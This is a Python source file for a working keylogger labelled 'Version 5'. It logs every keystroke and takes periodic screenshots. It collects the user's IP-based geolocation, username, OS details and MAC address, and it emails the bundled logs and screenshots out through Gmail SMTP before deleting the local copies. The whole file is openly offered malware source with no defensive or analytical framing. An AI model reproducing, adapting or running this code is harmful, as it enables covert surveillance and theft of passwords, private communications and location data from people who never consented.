# Keylogger Version 5 - December 12, 2023

import json
import tempfile
import sys
import requests
import smtplib
import time
import os
import platform
import getpass
import re
import uuid
import threading
import datetime
import pyautogui
import shutil

from urllib import request
from pynput.keyboard import Listener
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

class ReconHandler:
    def __init__(self):
        self.data_geo = self.get_geolocation()
        self.data_sys = self.get_system()

    def get_geolocation(self):
        ip = requests.get("http://ipinfo.io").json()["ip"]
        fields = "isp,city,regionName,country,zip,lat,lon,currency,proxy"

        url = f"http://ip-api.com/json/{ip}?fields={fields}"
        data = json.loads(request.urlopen(url).read())

        info = dict()

        info["ip"] = f"IPv4 Address: {ip}"
        info["isp"] =  f"ISP: {str(data['isp'])}\n"
        info["city"] = f"City: {str(data['city'])}"
        info["region"] = f"Region: {str(data['regionName'])}"
        info["country"] = f"Country: {str(data['country'])}"
        info["zip_code"] = f"Zip Code: {str(data['zip'])}\n"
        info["time_zone"] = f"Time Zone: {str(time.tzname[time.daylight])}\n"
        info["latitude"] = f"Latitude: {str(data['lat'])}"
        info["longitude"] = f"Longitude: {str(data['lon'])}\n"
        info["proxy"] = f"Proxy: {str(data['proxy'])}"

        return info

    def get_system(self):
        info = dict()

        info["username"] =  f"User: {str(getpass.getuser())}\n"
        info["system"] = f"System: {str(sys.platform)}"
        info["release"] = f"Release: {str(platform.release())}"
        info["version"] = f"Version: {str(platform.version())}\n"
        info["machine"] = f"Machine: {str(platform.machine())}"
        info["processor"] = f"Processor: {str(platform.processor())}\n"
        info["mac_address"] = f"MAC Address: {str(':'.join(re.findall('..', '%012x' % uuid.getnode())).upper())}"

        return info
    
class SmtpHandler:
    def __init__(self):
        self.HOST = "smtp.gmail.com"
        self.PORT = 587
        # self.PORT = 465 

        # e.g. joe@gmail.com
        self.SENDER = " "
        self.SENDER_PASS = " "

        self.RECEIVER = self.SENDER

        self.server = None

    def connect(self):
        try:
            self.server = smtplib.SMTP(self.HOST, self.PORT)
            self.server.starttls()
            self.server.login(self.SENDER, self.SENDER_PASS)
        except Exception as e:
            print(f"Error during connection: {e}")
        
    def is_connected(self):
        try: 
            status = self.server.noop()[0] 
        except: 
            status = -1

        # return True if status == 250 else False
        return status == 250

    def send_email(self, message):
        if not self.is_connected(): 
            self.connect()
            
        self.server.sendmail(self.SENDER, self.RECEIVER, message)

class Main:
    def __init__(self):
        self.REPORT_RATE = 100
        self.SCREENSHOT_RATE = 25

        self.FILENAME_ZIP = "SCREENSHOTS.zip"
        self.FILENAME_KEYLOG = "KEYLOG.txt"
        self.FILENAME_GEOLOCATION = "GEOLOCATION.txt"
        self.FILENAME_SYSTEM = "SYSTEM.txt"

        self.num_keystrokes = 0
        self.num_screenshots = 0
        self.num_reports = 0

        self.temp_dir = None
        self.screenshot_dir = None

        self.smtp_handler = SmtpHandler()
        
        keylogger_thread = threading.Thread(target=self.keylogger)

        self.smtp_handler.connect()
        keylogger_thread.start()

    def keylogger(self):    
        def on_press(key):
            self.num_keystrokes += 1

            if not self.temp_dir: 
                self.temp_dir = tempfile.TemporaryDirectory()

            fpath_keylog = os.path.join(self.temp_dir.name, self.FILENAME_KEYLOG)

            with open(fpath_keylog, "a+") as file_keylog:
                time = datetime.datetime.now().strftime("%I:%M:%S %p")

                format = str(key).replace("'","").replace("Key.","")
                string = f"{time} [ {format} ]\n"
                
                file_keylog.write(string)

            if self.num_keystrokes % self.SCREENSHOT_RATE == 0:
                self.take_screenshot()
        
            if self.num_keystrokes == self.REPORT_RATE:
                self.num_keystrokes = 0

                report_thread = threading.Thread(target=self.make_report)
                report_thread.start()

        with Listener(on_press=on_press) as listener: 
            listener.join()

    def take_screenshot(self):
        if not self.screenshot_dir: 
            self.screenshot_dir = tempfile.TemporaryDirectory()

        self.num_screenshots += 1

        screenshot_name = f"Screenshot{str(self.num_screenshots)}.png"

        fpath = os.path.join(self.screenshot_dir.name, screenshot_name)

        image = pyautogui.screenshot()
        image.save(fpath)

    def attach_file(self, message, file_path, file_name, part):
        file = open(file_path, "rb")

        part.set_payload(file.read())
        encoders.encode_base64(part)

        part.add_header("Content-Disposition", f"attachment; filename= {file_name}")

        message.attach(part)
        file.close()

        os.remove(file_path)

    def make_report(self):
        self.num_reports += 1

        report_time = f"\nTime: {datetime.datetime.now().strftime('%I:%M %p')}"
        report_date = f"\nDate: {datetime.datetime.now().strftime('%a, %b %d, %Y')}"
        
        message = MIMEMultipart()
        message["From"] = self.smtp_handler.SENDER
        message["To"] = self.smtp_handler.RECEIVER
        message["Subject"] = f"Keylogger Report #{str(self.num_reports)}"

        body = f"Report Data:\n{report_date + report_time}\n"

        message.attach(MIMEText(body, "plain"))

        txt_geo_path = os.path.join(self.temp_dir.name, self.FILENAME_GEOLOCATION)
        txt_sys_path = os.path.join(self.temp_dir.name, self.FILENAME_SYSTEM)

        with open(txt_geo_path, "a+") as txt_geo:
            data = ReconHandler().data_geo

            for info in data: 
                txt_geo.write(f"{data[info]}\n")

        with open(txt_sys_path, "a+") as txt_sys:
            data = ReconHandler().data_sys

            for info in data: 
                txt_sys.write(f"{data[info]}\n")

        for file_name in os.listdir(self.temp_dir.name):
            txt_path = os.path.join(self.temp_dir.name, file_name)
            part = MIMEBase("application", "octet-stream")
            
            self.attach_file(message, txt_path, file_name, part)

        zip_path = shutil.make_archive(self.FILENAME_ZIP, 'zip', self.screenshot_dir.name)
        part = MIMEBase('application', 'zip')

        self.attach_file(message, zip_path, self.FILENAME_ZIP, part)

        for file_name in os.listdir(self.screenshot_dir.name):
            img_path = os.path.join(self.screenshot_dir.name, file_name)

            os.remove(img_path)

        self.smtp_handler.send_email(message.as_string())

if __name__ == "__main__":
    Main()